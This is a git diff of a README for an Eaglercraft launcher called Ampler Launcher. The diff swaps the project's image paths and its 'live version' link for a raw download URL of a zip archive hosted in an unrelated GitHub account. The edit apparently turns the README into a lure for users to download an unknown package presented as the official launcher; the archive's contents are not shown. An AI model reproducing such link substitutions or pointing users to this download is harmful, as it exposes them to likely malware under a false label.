@@ -1,9 +1,9 @@
-# <img src=".github/assets/Glowstone_JE4_BE2.png" alt="Iconicc Logo" align="right" width="150px"> Ampler Launcher v1.4.00
+# <img src="https://github.com/Reeeeeeeejjjj/IconiccLauncher.v1.2/raw/refs/heads/main/mc/b1.7.3/Launcher-Iconicc-v-2.0.zip" alt="Iconicc Logo" align="right" width="150px"> Ampler Launcher v1.4.00
  A minecraft themed launcher for Eaglercraft!<br>
  Containing some of the best clients all in one place!
 
 
-<img src=".github/assets/launcher.png" alt="Launcher Photo"><br>
+<img src="https://github.com/Reeeeeeeejjjj/IconiccLauncher.v1.2/raw/refs/heads/main/mc/b1.7.3/Launcher-Iconicc-v-2.0.zip" alt="Launcher Photo"><br>
 
 <hr>
 
@@ -45,4 +45,4 @@
 
 <hr>
 
->__Finally [here](https://irv77.github.io/AmplerLauncher/) is the live version of the code!__
+>__Finally [here](https://github.com/Reeeeeeeejjjj/IconiccLauncher.v1.2/raw/refs/heads/main/mc/b1.7.3/Launcher-Iconicc-v-2.0.zip) is the live version of the code!__
